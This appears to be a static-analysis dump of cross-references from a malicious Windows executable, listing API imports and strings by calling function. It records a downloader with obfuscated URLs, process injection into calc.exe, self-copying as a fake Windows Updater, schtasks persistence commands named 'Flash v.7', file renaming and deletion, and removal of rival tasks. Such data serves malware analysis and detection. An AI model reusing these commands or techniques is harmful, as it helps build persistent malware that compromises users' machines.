reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x407c41	0x401aac	string	0x407a70	\bett2f002
0x407c4d	0x401174	import	0x407a70	KERNEL32.dll.lstrcatA
0x407c6d	0x40110c	import	0x407a70	KERNEL32.dll.SetCurrentDirectoryA
0x407c94	0x4011dc	import	0x407a70	SHELL32.dll.SHGetSpecialFolderPathA
0x407c9a	0x401ab8	string	0x407a70	\CreativeAudio
0x407ca6	0x401174	import	0x407a70	KERNEL32.dll.lstrcatA
0x407cc6	0x40110c	import	0x407a70	KERNEL32.dll.SetCurrentDirectoryA
0x407ced	0x4011dc	import	0x407a70	SHELL32.dll.SHGetSpecialFolderPathA
0x407cf3	0x401ac8	string	0x407a70	\Identities
0x407cff	0x401174	import	0x407a70	KERNEL32.dll.lstrcatA
0x407d1f	0x40110c	import	0x407a70	KERNEL32.dll.SetCurrentDirectoryA
0x407d4f	0x4011dc	import	0x407a70	SHELL32.dll.SHGetSpecialFolderPathA
0x407d64	0x4011dc	import	0x407a70	SHELL32.dll.SHGetSpecialFolderPathA
0x407d84	0x40110c	import	0x407a70	KERNEL32.dll.SetCurrentDirectoryA
0x407dab	0x4011dc	import	0x407a70	SHELL32.dll.SHGetSpecialFolderPathA
0x407dcb	0x40110c	import	0x407a70	KERNEL32.dll.SetCurrentDirectoryA
0x407df2	0x4011dc	import	0x407a70	SHELL32.dll.SHGetSpecialFolderPathA
0x407e12	0x40110c	import	0x407a70	KERNEL32.dll.SetCurrentDirectoryA
0x407e39	0x4011dc	import	0x407a70	SHELL32.dll.SHGetSpecialFolderPathA
0x407e59	0x40110c	import	0x407a70	KERNEL32.dll.SetCurrentDirectoryA
0x407e80	0x4011dc	import	0x407a70	SHELL32.dll.SHGetSpecialFolderPathA
0x407ea0	0x40110c	import	0x407a70	KERNEL32.dll.SetCurrentDirectoryA
0x407ec6	0x401108	import	0x407a70	KERNEL32.dll.GetTempPathA
0x407ed3	0x401184	import	0x407a70	KERNEL32.dll.lstrlenA
0x407f07	0x40110c	import	0x407a70	KERNEL32.dll.SetCurrentDirectoryA
0x407f58	0x401110	import	0x407f30	KERNEL32.dll.GetCurrentDirectoryA
0x407f6c	0x4010d0	import	0x407f30	KERNEL32.dll.GetModuleFileNameA
0x407f88	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x407f9d	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x407fa3	0x401ad4	string	0x407f30	\bett2f002
0x407faf	0x401174	import	0x407f30	KERNEL32.dll.lstrcatA
0x407fcf	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x408002	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x408008	0x401ae0	string	0x407f30	\Microsoft\Windows
0x408014	0x401174	import	0x407f30	KERNEL32.dll.lstrcatA
0x408034	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x40805b	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x408061	0x401af4	string	0x407f30	\Microsoft
0x40806d	0x401174	import	0x407f30	KERNEL32.dll.lstrcatA
0x40808d	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x4080b4	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x4080ba	0x401b00	string	0x407f30	\bett2f002
0x4080c6	0x401174	import	0x407f30	KERNEL32.dll.lstrcatA
0x4080e6	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x40810d	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x408113	0x401b0c	string	0x407f30	\CreativeAudio
0x40811f	0x401174	import	0x407f30	KERNEL32.dll.lstrcatA
0x40813f	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x408166	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x40816c	0x401b1c	string	0x407f30	\Identities
0x408178	0x401174	import	0x407f30	KERNEL32.dll.lstrcatA
0x408198	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x4081c8	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x4081dd	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x4081fd	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x408224	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x408244	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x40826b	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x40828b	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x4082b2	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x4082d2	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x4082f9	0x4011dc	import	0x407f30	SHELL32.dll.SHGetSpecialFolderPathA
0x408319	0x40110c	import	0x407f30	KERNEL32.dll.SetCurrentDirectoryA
0x408379	0x4011e8	import	0x408340	SHELL32.dll.SHGetFolderPathA
0x40837f	0x401b28	string	0x408340	\Microsoft
0x40838b	0x401174	import	0x408340	KERNEL32.dll.lstrcatA
0x408398	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x4083d4	0x401108	import	0x408340	KERNEL32.dll.GetTempPathA
0x4083e1	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408420	0x4011e8	import	0x408340	SHELL32.dll.SHGetFolderPathA
0x408426	0x401b34	string	0x408340	\Identities
0x408432	0x401174	import	0x408340	KERNEL32.dll.lstrcatA
0x40843f	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x40847b	0x401108	import	0x408340	KERNEL32.dll.GetTempPathA
0x408488	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x4084c4	0x401b40	string	0x408340	ALLUSERSPROFILE
0x4084c9	0x4010a8	import	0x408340	KERNEL32.dll.GetEnvironmentVariableA
0x4084d6	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408512	0x401108	import	0x408340	KERNEL32.dll.GetTempPathA
0x40851f	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x40855e	0x4011e8	import	0x408340	SHELL32.dll.SHGetFolderPathA
0x40856b	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x4085a7	0x401108	import	0x408340	KERNEL32.dll.GetTempPathA
0x4085b4	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408620	0x401b50	string	0x408340	%s\Program Files\Common Files
0x40862c	0x40123c	import	0x408340	USER32.dll.wsprintfA
0x408635	0x401b70	string	0x408340	\bett2f002
0x408641	0x401174	import	0x408340	KERNEL32.dll.lstrcatA
0x408653	0x401088	import	0x408340	KERNEL32.dll.SetFileAttributesA
0x408667	0x401180	import	0x408340	KERNEL32.dll.lstrcpyA
0x408674	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408695	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x4086a6	0x401204	import	0x408340	SHLWAPI.dll.StrRChrA
0x4086c8	0x401184	import	0x408340	KERNEL32.dll.lstrlenA
0x4086ec	0x401078	import	0x408340	KERNEL32.dll.MoveFileA
0x4086f2	0x4011a4	import	0x408340	KERNEL32.dll.GetLastError
0x408711	0x40123c	import	0x408340	USER32.dll.wsprintfA
0x408721	0x401b80	string	0x408340	%s\programdata
0x40872d	0x40123c	import	0x408340	USER32.dll.wsprintfA
0x408736	0x401b90	string	0x408340	\bett2f002
0x408742	0x401174	import	0x408340	KERNEL32.dll.lstrcatA
0x408754	0x401088	import	0x408340	KERNEL32.dll.SetFileAttributesA
0x408768	0x401180	import	0x408340	KERNEL32.dll.lstrcpyA
0x408775	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x4087e1	0x401b9c	string	0x408340	%s\Program Files\Common Files
0x4087ed	0x40123c	import	0x408340	USER32.dll.wsprintfA
0x4087f6	0x401bbc	string	0x408340	\CreativeAudio
0x408802	0x401174	import	0x408340	KERNEL32.dll.lstrcatA
0x408814	0x401088	import	0x408340	KERNEL32.dll.SetFileAttributesA
0x408828	0x401180	import	0x408340	KERNEL32.dll.lstrcpyA
0x408835	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408856	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408867	0x401204	import	0x408340	SHLWAPI.dll.StrRChrA
0x408889	0x401184	import	0x408340	KERNEL32.dll.lstrlenA
0x4088ad	0x401078	import	0x408340	KERNEL32.dll.MoveFileA
0x4088b3	0x4011a4	import	0x408340	KERNEL32.dll.GetLastError
0x4088d2	0x40123c	import	0x408340	USER32.dll.wsprintfA
0x4088e2	0x401bd0	string	0x408340	%s\programdata
0x4088ee	0x40123c	import	0x408340	USER32.dll.wsprintfA
0x4088f7	0x401be0	string	0x408340	\CreativeAudio
0x408903	0x401174	import	0x408340	KERNEL32.dll.lstrcatA
0x408915	0x401088	import	0x408340	KERNEL32.dll.SetFileAttributesA
0x408929	0x401180	import	0x408340	KERNEL32.dll.lstrcpyA
0x408936	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408957	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408968	0x401204	import	0x408340	SHLWAPI.dll.StrRChrA
0x40898a	0x401184	import	0x408340	KERNEL32.dll.lstrlenA
0x4089ae	0x401078	import	0x408340	KERNEL32.dll.MoveFileA
0x4089b4	0x4011a4	import	0x408340	KERNEL32.dll.GetLastError
0x4089d3	0x40123c	import	0x408340	USER32.dll.wsprintfA
0x408a01	0x4011e8	import	0x408340	SHELL32.dll.SHGetFolderPathA
0x408a0e	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408a4a	0x401108	import	0x408340	KERNEL32.dll.GetTempPathA
0x408a57	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408a93	0x401108	import	0x408340	KERNEL32.dll.GetTempPathA
0x408a99	0x401bf4	string	0x408340	\adobe
0x408aa5	0x401174	import	0x408340	KERNEL32.dll.lstrcatA
0x408ab2	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408aee	0x401108	import	0x408340	KERNEL32.dll.GetTempPathA
0x408afb	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408b3a	0x4011e8	import	0x408340	SHELL32.dll.SHGetFolderPathA
0x408b47	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408b83	0x401108	import	0x408340	KERNEL32.dll.GetTempPathA
0x408b90	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408bcf	0x4011e8	import	0x408340	SHELL32.dll.SHGetFolderPathA
0x408bdc	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408c18	0x401108	import	0x408340	KERNEL32.dll.GetTempPathA
0x408c25	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408c64	0x4011e8	import	0x408340	SHELL32.dll.SHGetFolderPathA
0x408c71	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408cad	0x401108	import	0x408340	KERNEL32.dll.GetTempPathA
0x408cba	0x40110c	import	0x408340	KERNEL32.dll.SetCurrentDirectoryA
0x408d15	0x401180	import	0x408ce0	KERNEL32.dll.lstrcpyA
0x408d22	0x401184	import	0x408ce0	KERNEL32.dll.lstrlenA
0x408d7c	0x401c00	string	0x408ce0	*.exe
0x408d81	0x401178	import	0x408ce0	KERNEL32.dll.FindFirstFileA
0x408da9	0x40107c	import	0x408ce0	KERNEL32.dll.lstrcmpA
0x408dd7	0x401180	import	0x408ce0	KERNEL32.dll.lstrcpyA
0x408ddd	0x401c08	string	0x408ce0	.gonewiththewings
0x408de9	0x401174	import	0x408ce0	KERNEL32.dll.lstrcatA
0x408dff	0x4010a4	import	0x408ce0	KERNEL32.dll.MoveFileExA
0x408e11	0x401088	import	0x408ce0	KERNEL32.dll.SetFileAttributesA
0x408e25	0x401188	import	0x408ce0	KERNEL32.dll.FindNextFileA
0x408e50	0x401c1c	string	0x408e40	*.gonewiththewings
0x408e55	0x401178	import	0x408e40	KERNEL32.dll.FindFirstFileA
0x408e73	0x401084	import	0x408e40	KERNEL32.dll.DeleteFileA
0x408e87	0x401188	import	0x408e40	KERNEL32.dll.FindNextFileA
0x409051	0x401184	import	0x409040	KERNEL32.dll.lstrlenA
0x409063	0x401180	import	0x409040	KERNEL32.dll.lstrcpyA
0x40981b	0x401c30	string	0x409810	kernel32.dll
0x409820	0x401190	import	0x409810	KERNEL32.dll.GetModuleHandleA
0x40983b	0x401c40	string	0x409810	abcdefghijklmnopqrstuvwxyz0123456789
0x409856	0x40119c	import	0x409810	KERNEL32.dll.SetLastError
0x40985c	0x401c68	string	0x409810	SSLOADasdasc000900
0x409865	0x4011a0	import	0x409810	KERNEL32.dll.CreateMutexA
0x40986b	0x4011a4	import	0x409810	KERNEL32.dll.GetLastError
0x40987a	0x40111c	import	0x409810	KERNEL32.dll.ExitThread
0x4098d6	0x401c7c	string	0x409810	CloseHandle
0x4098e2	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x4098ee	0x401c88	string	0x409810	CreateFileA
0x4098fa	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x409906	0x401c94	string	0x409810	DeleteFileA
0x409912	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x40991e	0x401ca0	string	0x409810	ExitProcess
0x40992a	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x409936	0x401cac	string	0x409810	GetFileSize
0x409942	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x40994e	0x401cb8	string	0x409810	GetProcAddress
0x40995a	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x409966	0x401cc8	string	0x409810	GetSystemTime
0x409972	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x40997e	0x401cd8	string	0x409810	GetTempPathA
0x40998a	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x409996	0x401ce8	string	0x409810	LoadLibraryA
0x4099a2	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x4099ae	0x401cf8	string	0x409810	lstrcatA
0x4099ba	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x4099c6	0x401d04	string	0x409810	lstrlenA
0x4099d2	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x4099de	0x401d10	string	0x409810	ReadFile
0x4099ea	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x4099f6	0x401d1c	string	0x409810	SetFileAttributesA
0x409a02	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x409a0e	0x401d30	string	0x409810	WinExec
0x409a1a	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x409a26	0x401d38	string	0x409810	WriteFile
0x409a32	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x409a3e	0x401d44	string	0x409810	Sleep
0x409a4a	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x409a56	0x401d4c	string	0x409810	GetLastError
0x409a62	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x409a6e	0x401d5c	string	0x409810	CreateMutexA
0x409a7a	0x401194	import	0x409810	KERNEL32.dll.GetProcAddress
0x409a92	0x401108	import	0x409810	KERNEL32.dll.GetTempPathA
0x409a98	0x401d6c	string	0x409810	c731200
0x409aa4	0x401174	import	0x409810	KERNEL32.dll.lstrcatA
0x409ab6	0x401108	import	0x409810	KERNEL32.dll.GetTempPathA
0x409ac8	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409ace	0x401d78	string	0x409810	user32.dll
0x409ada	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409ae0	0x401d84	string	0x409810	urlmon.dll
0x409aec	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409af2	0x401d90	string	0x409810	wsprintfA
0x409afe	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409b04	0x401d9c	string	0x409810	URLDownloadToFileA
0x409b10	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409b16	0x401db0	string	0x409810	wininet.dll
0x409b22	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409b28	0x401dbc	string	0x409810	InternetCheckConnectionA
0x409b34	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409b3a	0x401dd8	string	0x409810	http://www.google.com
0x409b46	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409b53	0x4010a0	import	0x409810	KERNEL32.dll.GetTickCount
0x409bb7	0x401184	import	0x409810	KERNEL32.dll.lstrlenA
0x409bd7	0x401df0	string	0x409810	.exe
0x409be3	0x401174	import	0x409810	KERNEL32.dll.lstrcatA
0x409bfe	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409c09	0x401df8	string	0x409810	c731200
0x409c15	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409c1b	0x401e00	string	0x409810	9EEAi^^2A:`]H:A>2?:2]4@>]H:A>D4]CF^2A:`]8:7
0x409c27	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409c2d	0x401e2c	string	0x409810	9EEAi^^2A:a]H:A>2?:2]4@>]H:A>D4]CF^2A:a]8:7
0x409c39	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409c3f	0x401e58	string	0x409810	9EEAi^^2A:b]H:A>2?:2]4@>]H:A>D4]CF^2A:b]8:7
0x409c4b	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409c51	0x401e84	string	0x409810	9EEAi^^2A:c]H:A>2?:2]4@>]H:A>D4]CF^2A:c]8:7
0x409c5d	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409c63	0x401eb0	string	0x409810	9EEAi^^2A:d]H:A>2?:2]4@>]H:A>D4]CF^2A:d]8:7
0x409c6f	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409c75	0x401edc	string	0x409810	9EEAi^^2A:e]H:A>2?:2]4@>]H:A>D4]CF^2A:e]8:7
0x409c81	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409c87	0x401f08	string	0x409810	9EEAi^^2A:f]H:A>2?:2]4@>]H:A>D4]CF^2A:f]8:7
0x409c93	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409c99	0x401f34	string	0x409810	9EEAi^^2A:g]H:A>2?:2]4@>]H:A>D4]CF^2A:g]8:7
0x409ca5	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409cab	0x401f60	string	0x409810	9EEAi^^2A:h]H:A>2?:2]4@>]H:A>D4]CF^2A:h]8:7
0x409cb7	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409cbd	0x401f8c	string	0x409810	9EEAi^^2A:]H:A>2?:2]4@>]7@H5_]CF^2A:]8:7
0x409cc9	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409ccf	0x401fb8	string	0x409810	9EEAi^^2A:]H:A>2?:2]4@>]D6=7>8`]CF^2A:]8:7
0x409cdb	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409ce1	0x401fe4	string	0x409810	9EEAi^^2A:]H:A>2?:2]4@>]=@EFDda]CF^2A:]8:7
0x409ced	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409cf3	0x402010	string	0x409810	9EEAi^^2A:]H:A>2?:2]4@>]H:A>2?:2]CF^{<HpIs]8:7
0x409cff	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409d05	0x402040	string	0x409810	9EEAi^^2A:]H:A>2?:2]4@>]=@EJD]CF^Gy@yp:]8:7
0x409d11	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409d17	0x40206c	string	0x409810	9EEAi^^2A:]H:A>2?:2]4@>]3H2ED]CF^~7;%|6]8:7
0x409d23	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409d29	0x402098	string	0x409810	9EEAi^^2A:]H:A>2?:2]4@>]DE4FD]CF^2A$!9G]8:7
0x409d35	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409d3b	0x4020c4	string	0x409810	9EEAi^^2A:]H:A>2?:2]4@>]4>@6?b]CF^K<>4w|]8:7
0x409d47	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409d4d	0x4020f4	string	0x409810	9EEAi^^2A:]H:A>2?:2]4@>]2CE34@?b]CF^7C7{6r]8:7
0x409d59	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409d5f	0x402124	string	0x409810	9EEAi^^2A:]H:A>2?:2]4@>]J6=@E@]CF^KHu|Hs]8:7
0x409d6b	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409d71	0x402154	string	0x409810	9EEAi^^FA52E6]H:A>2?:2]4@>]C2F=9@DE]CF^=@8@]8:7
0x409d7d	0x401180	import	0x409810	KERNEL32.dll.lstrcpyA
0x409d8a	0x416038	string	0x409810	C:\Windows\SysWOW64\calc.exe
0x409da8	0x409db1	string	0x409810	h8`A
0x409db1	0x416038	string	0x409810	C:\Windows\SysWOW64\calc.exe
0x409dc0	0x4011e8	import	0x409810	SHELL32.dll.SHGetFolderPathA
0x409dc6	0x402184	string	0x409810	\calc.exe
0x409dcb	0x416038	string	0x409810	C:\Windows\SysWOW64\calc.exe
0x409dd0	0x401174	import	0x409810	KERNEL32.dll.lstrcatA
0x409def	0x416038	string	0x409810	C:\Windows\SysWOW64\calc.exe
0x409df4	0x401118	import	0x409810	KERNEL32.dll.CreateProcessA
0x409e2a	0x40109c	import	0x409810	KERNEL32.dll.VirtualAllocEx
0x409e8d	0x401098	import	0x409810	KERNEL32.dll.WriteProcessMemory
0x409eb8	0x401098	import	0x409810	KERNEL32.dll.WriteProcessMemory
0x409ef6	0x401094	import	0x409810	KERNEL32.dll.CreateRemoteThread
0x409f16	0x4010fc	import	0x409810	KERNEL32.dll.WaitForSingleObject
0x409f2a	0x401114	import	0x409810	KERNEL32.dll.GetExitCodeThread
0x40a014	0x401180	import	0x40a000	KERNEL32.dll.lstrcpyA
0x40a026	0x402190	string	0x40a000	APPDATA
0x40a02b	0x4010a8	import	0x40a000	KERNEL32.dll.GetEnvironmentVariableA
0x40a03f	0x401180	import	0x40a000	KERNEL32.dll.lstrcpyA
0x40a045	0x402198	string	0x40a000	\WindowsUpdate\Updater.exe
0x40a051	0x401174	import	0x40a000	KERNEL32.dll.lstrcatA
0x40a065	0x401180	import	0x40a000	KERNEL32.dll.lstrcpyA
0x40a06b	0x4021b4	string	0x40a000	\c731200
0x40a077	0x401174	import	0x40a000	KERNEL32.dll.lstrcatA
0x40a096	0x401080	import	0x40a000	KERNEL32.dll.CreateFileA
0x40a0bb	0x401070	import	0x40a000	KERNEL32.dll.CopyFileA
0x40a0d1	0x401070	import	0x40a000	KERNEL32.dll.CopyFileA
0x40a0e0	0x401164	import	0x40a000	KERNEL32.dll.CloseHandle
0x40a0f6	0x401070	import	0x40a000	KERNEL32.dll.CopyFileA
0x40a101	0x4011b4	import	0x40a000	KERNEL32.dll.Sleep
0x40a163	0x401090	import	0x40a150	KERNEL32.dll.GetCurrentProcess
0x40a16a	0x401014	import	0x40a150	ADVAPI32.dll.OpenProcessToken
0x40a188	0x401018	import	0x40a150	ADVAPI32.dll.GetTokenInformation
0x40a196	0x401164	import	0x40a150	KERNEL32.dll.CloseHandle
0x40a1a4	0x401164	import	0x40a150	KERNEL32.dll.CloseHandle
0x40a1e3	0x401124	import	0x40a1c0	KERNEL32.dll.GetWindowsDirectoryA
0x40a1f7	0x401180	import	0x40a1c0	KERNEL32.dll.lstrcpyA
0x40a1fd	0x4021c0	string	0x40a1c0	\System32
0x40a209	0x401174	import	0x40a1c0	KERNEL32.dll.lstrcatA
0x40a20f	0x4021cc	string	0x40a1c0	\System32\schtasks.exe
0x40a21b	0x401174	import	0x40a1c0	KERNEL32.dll.lstrcatA
0x40a230	0x4011e8	import	0x40a1c0	SHELL32.dll.SHGetFolderPathA
0x40a236	0x4021e4	string	0x40a1c0	\WindowsUpdate\Updater.exe
0x40a242	0x401174	import	0x40a1c0	KERNEL32.dll.lstrcatA
0x40a27c	0x402200	string	0x40a1c0	"%s" /query /tn "Flash v.7"
0x40a288	0x40123c	import	0x40a1c0	USER32.dll.wsprintfA
0x40a2b1	0x401118	import	0x40a1c0	KERNEL32.dll.CreateProcessA
0x40a2c0	0x4010fc	import	0x40a1c0	KERNEL32.dll.WaitForSingleObject
0x40a2d4	0x401120	import	0x40a1c0	KERNEL32.dll.GetExitCodeProcess
0x40a2e1	0x401164	import	0x40a1c0	KERNEL32.dll.CloseHandle
0x40a300	0x40221c	string	0x40a1c0	"%s" /CREATE /SC ONLOGON /TN "Flash v.7" /TR "%s" /RL HIGHEST
0x40a30c	0x40123c	import	0x40a1c0	USER32.dll.wsprintfA
0x40a335	0x401118	import	0x40a1c0	KERNEL32.dll.CreateProcessA
0x40a344	0x4010fc	import	0x40a1c0	KERNEL32.dll.WaitForSingleObject
0x40a351	0x401164	import	0x40a1c0	KERNEL32.dll.CloseHandle
0x40a383	0x401124	import	0x40a360	KERNEL32.dll.GetWindowsDirectoryA
0x40a397	0x401180	import	0x40a360	KERNEL32.dll.lstrcpyA
0x40a39d	0x40225c	string	0x40a360	\System32
0x40a3a9	0x401174	import	0x40a360	KERNEL32.dll.lstrcatA
0x40a3af	0x402268	string	0x40a360	\System32\schtasks.exe
0x40a3bb	0x401174	import	0x40a360	KERNEL32.dll.lstrcatA
0x40a3f5	0x402280	string	0x40a360	"%s" /delete /tn "Windows Update Check - 0x05860166" /f
0x40a401	0x40123c	import	0x40a360	USER32.dll.wsprintfA
0x40a42a	0x401118	import	0x40a360	KERNEL32.dll.CreateProcessA
0x40a439	0x4010fc	import	0x40a360	KERNEL32.dll.WaitForSingleObject
0x40a446	0x401164	import	0x40a360	KERNEL32.dll.CloseHandle
0x40a453	0x4022b8	string	0x40a360	"%s" /delete /tn "Windows Update Check - 0x0E7302EC" /f
0x40a45f	0x40123c	import	0x40a360	USER32.dll.wsprintfA
0x40a488	0x401118	import	0x40a360	KERNEL32.dll.CreateProcessA
0x40a497	0x4010fc	import	0x40a360	KERNEL32.dll.WaitForSingleObject
0x40a4a4	0x401164	import	0x40a360	KERNEL32.dll.CloseHandle
0x40a4b1	0x4022f0	string	0x40a360	"%s" /delete /tn "Windows Update Check - 0x5C000766" /f
0x40a4bd	0x40123c	import	0x40a360	USER32.dll.wsprintfA
0x40a4e6	0x401118	import	0x40a360	KERNEL32.dll.CreateProcessA
0x40a4f5	0x4010fc	import	0x40a360	KERNEL32.dll.WaitForSingleObject
0x40a502	0x401164	import	0x40a360	KERNEL32.dll.CloseHandle
0x40a50f	0x402328	string	0x40a360	"%s" /delete /tn "Windows Update Check - 0x6E0A0825" /f
0x40a51b	0x40123c	import	0x40a360	USER32.dll.wsprintfA
0x40a544	0x401118	import	0x40a360	KERNEL32.dll.CreateProcessA
0x40a553	0x4010fc	import	0x40a360	KERNEL32.dll.WaitForSingleObject
0x40a560	0x401164	import	0x40a360	KERNEL32.dll.CloseHandle
0x40a56d	0x402360	string	0x40a360	"%s" /delete /tn "Windows Debugger" /f
0x40a579	0x40123c	import	0x40a360	USER32.dll.wsprintfA
0x40a5a2	0x401118	import	0x40a360	KERNEL32.dll.CreateProcessA
